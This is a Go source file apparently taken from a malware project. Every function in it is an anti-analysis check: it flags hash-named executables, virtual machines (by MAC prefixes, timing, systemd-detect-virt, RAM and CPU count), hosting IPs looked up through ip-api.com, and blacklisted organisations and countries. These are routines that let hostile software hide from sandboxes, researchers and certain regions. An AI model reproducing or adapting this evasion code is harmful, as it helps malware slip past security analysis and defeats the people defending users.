package core

import (
	"bytes"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

func DetectHashedName() bool { //Check the file name, See if its a HASH
	match, _ := regexp.MatchString("[a-f0-9]{32}", os.Args[0])
	return match
}

func DetectVM() bool {
	initTime := time.Now()
	for _, v := range BadMACList {
		if strings.HasPrefix(getMacAddr()[0], v) {
			return true
		}
	}
	if TimeDifference(initTime, 5) {
		return true
	}
	out, _ := RunCmd("systemd-detect-virt")
	if out != "none" {
		return true
	}
	if GetRAM(2048) {
		return true
	}
	if GetCPUCores(2) {
		return true
	}
	return false
}

func DetectHosting() bool {
	rsp, _ := http.Get("http://ip-api.com/line/?fields=hosting")
	if rsp.StatusCode == 200 {
		defer rsp.Body.Close()
		buf, _ := ioutil.ReadAll(rsp.Body)
		if string(bytes.TrimSpace(buf)) == "true" {
			return true
		}
	}
	return false
}

func DetectOrganizations() bool {
	finished, _, _, _, _, Org := GEOIP()
	if finished {
		for _, v := range BlacklistOrganizations {
			if strings.Contains(strings.ToLower(Org), strings.ToLower(v)) {
				return true
			}
		}
	}
	return false
}

func DetectCountry() bool {
	finished, Country, _, _, _, _ := GEOIP()
	if finished {
		for _, v := range BlacklistCountries {
			if strings.Contains(strings.ToLower(Country), strings.ToLower(v)) {
				return true
			}
		}
	}
	return false
}

func TimeDifference(initTime time.Time, maxTimeAllowed int) bool {
	return time.Since(initTime) > time.Duration(maxTimeAllowed)*time.Second
}

func getMacAddr() []string {
	ifas, _ := net.Interfaces()
	var as []string
	for _, ifa := range ifas {
		a := ifa.HardwareAddr.String()
		if a != "" {
			as = append(as, a)
		}
	}
	return as
}
